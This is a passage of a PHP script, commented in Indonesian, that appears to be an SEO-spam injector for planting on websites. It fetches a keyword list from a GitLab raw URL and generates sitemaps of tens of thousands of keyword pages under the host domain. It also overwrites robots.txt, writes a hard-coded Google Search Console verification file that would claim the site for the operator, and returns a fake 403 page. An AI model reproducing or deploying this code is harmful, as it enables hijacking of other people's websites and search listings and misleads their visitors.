// 2. FUNGSI FETCH REMOTE FILE (Tanpa Warning cURL)
// =====================================================
function fetchRemoteFile($url)
{
    // Coba file_get_contents() terlebih dahulu (biasanya paling aman dari open_basedir)
    $content = @file_get_contents($url);

    if ($content !== false) {
        return $content;
    }

    // Fallback ke cURL
    if (function_exists('curl_init')) {
        $ch = curl_init($url);

        $curl_options = array(
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_CONNECTTIMEOUT => 10,
            CURLOPT_TIMEOUT        => 30,
            CURLOPT_USERAGENT      => 'Mozilla/5.0',
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_SSL_VERIFYHOST => 2
        );

        // FIX: Cek open_basedir dan safe_mode sebelum mengaktifkan FOLLOWLOCATION
        $open_basedir = ini_get('open_basedir');
        $safe_mode    = ini_get('safe_mode');
        $can_follow   = (empty($open_basedir) && !$safe_mode);

        if ($can_follow) {
            $curl_options[CURLOPT_FOLLOWLOCATION] = true;
            $curl_options[CURLOPT_MAXREDIRS]      = 5;
        }

        curl_setopt_array($ch, $curl_options);

        $content  = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($content !== false && $httpCode >= 200 && $httpCode < 300) {
            return $content;
        }

        // Fallback manual redirect jika server memblokir FOLLOWLOCATION
        if ($content !== false && ($httpCode == 301 || $httpCode == 302)) {
            $ch2 = curl_init($url);
            curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch2, CURLOPT_HEADER, true);
            curl_setopt($ch2, CURLOPT_NOBODY, true);
            curl_setopt($ch2, CURLOPT_CONNECTTIMEOUT, 10);
            curl_setopt($ch2, CURLOPT_TIMEOUT, 15);
            curl_setopt($ch2, CURLOPT_USERAGENT, 'Mozilla/5.0');
            curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, true);
            curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, 2);
            
            $headers = curl_exec($ch2);
            curl_close($ch2);

            if ($headers !== false && preg_match('/Location:\s*(\S+)/i', $headers, $m)) {
                return fetchRemoteFile(trim($m[1]));
            }
        }
    }

    return false;
}

// 3. FUNGSI ERROR 404 / FORBIDDEN
// =====================================================
function feedback404()
{
    header("HTTP/1.0 403 Forbidden");
    echo "<h1>403 Forbidden</h1>";
    exit();
}

// 4. FUNGSI GENERATE GOOGLE SEARCH CONSOLE (GSC)
// =====================================================
function generateGSCVerification($filename)
{
    if ($filename === null || $filename === '') {
        $filename = 'googlee198e4d83300e0d1.html';
    }
    $content = 'google-site-verification: ' . $filename;

    if (file_put_contents($filename, $content) === false) {
        error_log("[GSC] Gagal membuat file verifikasi: {$filename}");
        return false;
    }
    error_log("[GSC] Berhasil membuat file verifikasi: {$filename}");
    return true;
}

// =====================================================
// 5. FUNGSI GENERATE ROBOTS.TXT
// =====================================================
function generateRobotsTxt($domain_url, $sitemap_file)
{
    if ($sitemap_file === null || $sitemap_file === '') {
        $sitemap_file = 'sitemap-index.xml';
    }
    $robots  = "User-agent: *\n";
    $robots .= "Allow: /\n\n";
    $robots .= "Sitemap: {$domain_url}{$sitemap_file}\n";

    if (file_put_contents("robots.txt", $robots) === false) {
        error_log("[robots] Gagal membuat robots.txt");
        return false;
    }
    error_log("[robots] Berhasil membuat robots.txt");
    return true;
}

// 6. FUNGSI DOWNLOAD KEYWORDS
// =====================================================
function downloadKeywordsAsXtxt($remote_url, $local_file)
{
    if ($remote_url === null || $remote_url === '') {
        $remote_url = 'https://gitlab.com/wongwaras/docsli/-/raw/main/api.txt';
    }
    if ($local_file === null || $local_file === '') {
        $local_file = 'x.txt';
    }
    $content = fetchRemoteFile($remote_url);
    if ($content === false) {
        error_log("[download] Gagal fetch: {$remote_url}");
        return false;
    }
    if (file_put_contents($local_file, $content) === false) {
        error_log("[download] Gagal menulis file: {$local_file}");
        return false;
    }
    error_log("[download] Berhasil download & simpan ke {$local_file} (" . strlen($content) . " bytes)");
    return $content;
}

// =====================================================
// 7. FUNGSI EXTRACT HEADER, FOOTER, & META
// =====================================================
function updateMetaTag(&$head, $pattern, $replacement)
{
    if (preg_match($pattern, $head)) {
        $head = preg_replace($pattern, $replacement, $head);
    } else {
        $head = preg_replace('/<\/head>/i', $replacement . "\n" . '</head>', $head);
    }
}

function extractHeader($html)
{
    if (preg_match('/<header\s[^>]*>.*?<\/header>/is', $html, $matches)) {
        return $matches[0];
    }
    if (preg_match('/<nav\s[^>]*>.*?<\/nav>/is', $html, $matches)) {
        return $matches[0];
    }
    return '';
}

function extractFooter($html)
{
    if (preg_match('/<footer[^>]*>.*?<\/footer>/is', $html, $matches)) {
        return $matches[0];
    }
    return '';
}

// --- Handle ?sitemap (Generate Sitemap) ---
if (isset($_GET['sitemap'])) {
    $protocol   = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http");
    $base_path  = $protocol . "://" . $_SERVER['HTTP_HOST'];
    $domain_url = $base_path . '/';
    $base_url   = $base_path . '/?id=';
    $sitemap_name = 'atom';
    $max_links_per_sitemap = 50000;

    $keywords_content = fetchRemoteFile($github_x_url);
    if ($keywords_content === false) {
        die("❌ Gagal baca x.txt. Silakan jalankan ?kw dulu untuk download keywords.");
    }

    $raw_lines = explode("\n", $keywords_content);
    $keywords  = array_map('trim', $raw_lines);
    $keywords  = array_filter($keywords);

    if (empty($keywords)) {
        die("❌ No valid keywords found di x.txt");
    }

    $sitemap_index  = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
    $sitemap_index .= '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;

    $sitemap_files = array();
    $i = 0;

    foreach ($keywords as $keyword) {
        $clean_keyword = str_replace(' ', '+', $keyword);
        $sitemap_num   = ceil(($i + 1) / $max_links_per_sitemap);

        if (!isset($sitemap_files[$sitemap_num])) {
            $sitemap_files[$sitemap_num]  = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
            $sitemap_files[$sitemap_num] .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
        }

        $full_url    = $base_url . $clean_keyword;
        $escaped_url = htmlspecialchars($full_url, ENT_QUOTES, 'UTF-8');

        $sitemap_files[$sitemap_num] .= "  <url>" . PHP_EOL;
        $sitemap_files[$sitemap_num] .= "    <loc>{$escaped_url}</loc>" . PHP_EOL;
        $sitemap_files[$sitemap_num] .= "  </url>" . PHP_EOL;

        $i++;
    }

    foreach ($sitemap_files as $num => $content) {
        $content .= '</urlset>' . PHP_EOL;
        $file_name = "{$sitemap_name}-{$num}.xml";
        file_put_contents($file_name, $content);

        $sitemap_index .= "  <sitemap>" . PHP_EOL;
        $sitemap_index .= "    <loc>" . htmlspecialchars($domain_url . $file_name, ENT_QUOTES, 'UTF-8') . "</loc>" . PHP_EOL;
        $sitemap_index .= "  </sitemap>" . PHP_EOL;
    }
    unset($content);

    $sitemap_index .= '</sitemapindex>' . PHP_EOL;
    file_put_contents("sitemap-index.xml", $sitemap_index);

    generateGSCVerification('googlee198e4d83300e0d1.html');
    generateRobotsTxt($domain_url, 'sitemap-index.xml');

    echo "✅ Sitemap & robots.txt generated dari x.txt!";
    exit();
}
